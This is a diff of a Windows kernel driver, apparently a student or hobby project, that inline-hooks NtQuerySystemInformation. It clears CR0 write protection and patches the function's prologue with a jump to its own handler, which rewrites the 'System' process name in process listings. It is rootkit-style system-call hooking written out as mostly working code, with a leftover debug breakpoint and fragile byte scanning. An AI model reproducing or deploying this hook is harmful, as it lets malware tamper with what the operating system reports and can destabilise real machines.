@@ -1,3 +1,4 @@
+#include <ntifs.h>
 #include <ntddk.h>
 #include <ntimage.h>
 
@@ -80,15 +81,21 @@ typedef struct _OldCode {
 
 #pragma pack (pop)
 
-const char message[] = "Your PC was HACKED!";
+const wchar_t message[] = L"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
+const wchar_t system[] = L"System";
+const unsigned sysLen = 12u;
+const char origProlog[] = { 0x8b, 0xff, 0x55, 0x8b, 0xec };
 OldCode OpPrcOld;
 far_jmp fjmp;
 ULONG NtQueryProcId;
 ULONG CR0Reg;
 
-PVOID oldNtQuerySystemInformation;
+PVOID origNtQuerySystemInformation;
 
 NTSTATUS newNtQuerySystemInformation(ULONG SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
+
+NTSTATUS _interceptor(ULONG SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
+
 #endif // INTERCEPTION
 
 
@@ -103,8 +110,10 @@ NTSTATUS NTAPI DriverEntry(IN PDRIVER_OBJECT driverObject, IN PUNICODE_STRING Re
 	UNICODE_STRING devName;
 	UNICODE_STRING symLink;
 #ifdef INTERCEPTION
-	POldCode func;
-	pfar_jmp fnjp;
+	//char* interceptor;
+	char* orig;
+	int t, i;
+	//char c;
 #endif // INTERCEPTION
 
 	DbgPrint(">>MDR: DriverEntry");
@@ -157,9 +166,44 @@ NTSTATUS NTAPI DriverEntry(IN PDRIVER_OBJECT driverObject, IN PUNICODE_STRING Re
 		break;
 	}
 
-	fjmp.PushOp = 0x68;
-	fjmp.PushArg = (PVOID)newNtQuerySystemInformation;
-	fjmp.RetOp = 0xC3;
+	/*interceptor = (char*)_interceptor;
+	t = 0;
+
+	c = 0x90;
+
+	while (interceptor[t] != c) {
+		t++;
+	}
+
+	i = 0;
+
+	while (interceptor[t] == c)
+	{
+		t++;
+		i++;
+	}
+
+	if (i == 10) {
+		interceptor = &(interceptor[t - i]);
+	}
+	else {
+		return STATUS_BAD_DATA;
+	}*/
+
+	orig = (char*)KeServiceDescriptorTable->ntoskrnl.ServiceTable[NtQueryProcId];
+
+	for (t = 0, i = 0;; t++) {
+		if (orig[t] == origProlog[i]) {
+			for (; i < sizeof(origProlog); i++, t++) {
+				if (orig[t] != origProlog[i]) {
+					return STATUS_BAD_DATA;
+				}
+			}
+			orig = &(orig[t - i]);
+			origNtQuerySystemInformation = (PVOID)((ULONG)orig + 5ul);
+			break;
+		}
+	}
 
 	__asm {
 		cli
@@ -168,22 +212,39 @@ NTSTATUS NTAPI DriverEntry(IN PDRIVER_OBJECT driverObject, IN PUNICODE_STRING Re
 		and EAX, 0xFFFEFFFF
 		mov CR0, EAX
 	}
-	
-	oldNtQuerySystemInformation = (PVOID)KeServiceDescriptorTable->ntoskrnl.ServiceTable[NtQueryProcId];
-	func = (POldCode)oldNtQuerySystemInformation;
-	OpPrcOld.One = func->One;
-	OpPrcOld.TWO = func->TWO;
 
-	fnjp = (pfar_jmp)oldNtQuerySystemInformation;
+	/*
+		mov EAX, orig
+		mov EAX, [EAX]
+		mov [EBX], EAX
+		mov EAX, orig
+		mov byte ptr[EAX], 0xe9
+		mov ECX, EBX
+		sub ECX, EAX
+		add ECX, 5
+		mov AL, [EAX + 4]
+		mov [EBX + 4], AL
 
-	fnjp->PushOp = fjmp.PushOp;
-	fnjp->PushArg = fjmp.PushArg;
-	fnjp->RetOp = fjmp.RetOp;
+		pop EBX
+	*/
+
+	//interceptor[0] = orig[0];
+	//
+	//((LONG*)&(interceptor[1]))[0] = ((LONG*)&(orig[1]))[0];
+
+	orig[0] = 0xe9;
+	*((ULONG*)&(orig[1])) = (ULONG)newNtQuerySystemInformation - (ULONG)KeServiceDescriptorTable->ntoskrnl.ServiceTable[NtQueryProcId] - 5ul;
+
+	//*((ULONG*)&interceptor) += 5ul;
+	//interceptor[0] = 0xe9;
+	//*((ULONG*)&interceptor) += 1ul;
+	//((ULONG*)interceptor)[0] = (ULONG)KeServiceDescriptorTable->ntoskrnl.ServiceTable[NtQueryProcId] - (ULONG)newNtQuerySystemInformation - 0x11;
 
 	__asm {
 		mov EAX, CR0Reg
 		mov CR0, EAX
 		sti
+		int 3
 	}
 
 #endif // INTERCEPTION
@@ -197,7 +258,7 @@ VOID unload(PDRIVER_OBJECT DO)
 	UNICODE_STRING* ustr;
 	PDeviceExtension pde;
 #ifdef INTERCEPTION
-	POldCode poc = (POldCode)oldNtQuerySystemInformation;
+	char* origFunc;
 #endif // INTERCEPTION
 
 	int t;
@@ -231,8 +292,11 @@ VOID unload(PDRIVER_OBJECT DO)
 		mov CR0, EAX
 	}
 
-	poc->One = OpPrcOld.One;
-	poc->TWO = OpPrcOld.TWO;
+	origFunc = (char*)origNtQuerySystemInformation;
+
+	for (t = 0; t < sizeof(origProlog); t++) {
+		origFunc[t] = origProlog[t];
+	}
 
 	__asm {
 		mov EAX, CR0Reg
@@ -314,67 +378,96 @@ void PloadImageNotifyRoutine(PUNICODE_STRING FullImageName, HANDLE ProcessId, PI
 
 }
 
-NTSTATUS newNtQuerySystemInformation(ULONG SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
-{
+__declspec(naked)
+NTSTATUS _interceptor(ULONG SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) {
 	__asm {
+		mov EAX, SystemInformationClass
 		mov EAX, SystemInformation
 		mov EAX, SystemInformationLength
 		mov EAX, ReturnLength
-		mov EAX, SystemInformationClass
-		sub EAX, 0x05
-		//jz __Continue
-		cli
-		mov EAX, CR0
-		mov CR0Reg, EAX
-		and EAX, 0xFFFEFFFF
-		mov CR0, EAX
-		lea EAX, OpPrcOld
-		mov EBX, oldNtQuerySystemInformation
-		mov AX, [EAX]
-		mov [EBX], AX
-		lea EAX, OpPrcOld
-		mov EAX, [EAX + 2]
-		mov [EBX + 2], EAX
-		xor EBX, EBX
-		mov EAX, CR0Reg
-		mov CR0, EAX
-		sti
-		int 3
-		push SystemInformationClass
-		push SystemInformation
-		push SystemInformationLength
-		push ReturnLength
-		jmp oldNtQuerySystemInformation
-		pop EBX
-		pop EBX
-		pop EBX
-		pop EBX
-		xor EBX, EBX
-		//call oldNtQuerySystemInformation
-		int 3
-		push EAX
-		cli
-		mov EAX, CR0
-		mov CR0Reg, EAX
-		and EAX, 0xFFFEFFFF
-		mov CR0, EAX
-		lea EAX, fjmp
-		lea EBX, [oldNtQuerySystemInformation]
-		mov AL, [EAX]
-		mov [EBX], AL
-		lea EAX, fjmp
-		mov EAX, [EAX + 1]
-		mov [EBX + 1], EAX
-		lea EAX, fjmp
-		mov AL, [EAX + 5]
-		mov [EBX + 5], AL
-		xor EBX, EBX
-		mov EAX, CR0Reg
-		mov CR0, EAX
-		sti
-		pop EAX
-		ret
+		mov EDI, EDI
+		push EBP
+		mov EBP, ESP
+		jmp origNtQuerySystemInformation
 	}
-//__Continue:
-	return STATUS_SUCCESS;
+}
+
+NTSTATUS newNtQuerySystemInformation(ULONG SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
+{
+	NTSTATUS result;
+	NTSTATUS inRes;
+	PVOID inBuff;
+	SYSTEM_PROCESS_INFORMATION* spi;
+	SIZE_T len;
+	ULONG length;
+	int i;
+	
+	result = _interceptor(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
+
+	if (ReturnLength == NULL) {
+		return result;
+	}
+
+	if (result != 0) {
+		return result;
+	}
+	
+	if (SystemInformationClass == 0x05) {
+		length = 0;
+		spi = (SYSTEM_PROCESS_INFORMATION*)SystemInformation;
+		while (length < SystemInformationLength)
+		{
+			if (spi->ImageName.Length == sysLen) {
+				if (memcmp(spi->ImageName.Buffer, system, sysLen) == 0) {
+					if (spi->ImageName.MaximumLength > sizeof(message)) {
+						for (i = 0; i < 15; i++) {
+							spi->ImageName.Buffer[i] = message[i];
+						}
+						spi->ImageName.Length = sizeof(message) - 2u;
+					}
+					else {
+						inBuff = NULL;
+						len = sizeof(message);
+						inRes = ZwAllocateVirtualMemory(ZwCurrentProcess(), &inBuff, (ULONG_PTR)NULL, &len, MEM_COMMIT, PAGE_READWRITE);
+						if (inRes == STATUS_SUCCESS) {
+							spi->ImageName.Buffer = (PWCH)inBuff;
+							spi->ImageName.MaximumLength = (USHORT)len;
+							spi->ImageName.Length = sizeof(message) - 2u;
+							memcpy(spi->ImageName.Buffer, message, sizeof(message));
+						}
+					}
+				}
+			}
+			//if (spi->ImageName.MaximumLength >= sizeof(message)) {
+			//	for (i = 0; i < 7; i++) {
+			//		spi->ImageName.Buffer[i] = message[i];
+			//	}
+			//	spi->ImageName.Length = 12u;
+			//}
+			if (spi->NextEntryOffset == 0) {
+				break;
+			}
+			length += spi->NextEntryOffset;
+			*((ULONG*)&spi) += spi->NextEntryOffset;
+		}
+	}
+
+	//if (SystemInformationClass == 0x05) {
+	//	length = 0;
+	//	spi = (SYSTEM_PROCESS_INFORMATION*)SystemInformation;
+	//	while (length < SystemInformationLength)
+	//	{
+	//		if (spi->ImageName.Length < spi->ImageName.MaximumLength) {
+	//			spi->ImageName.Buffer[spi->ImageName.Length++] = L'*';
+	//			spi->ImageName.Buffer[spi->ImageName.Length] = L'\n';
+	//		}
+	//		if (spi->NextEntryOffset == 0) {
+	//			break;
+	//		}
+	//		length += spi->NextEntryOffset;
+	//		*((ULONG*)&spi) += spi->NextEntryOffset;
+	//	}
+	//}
+	
+	return result;
 }
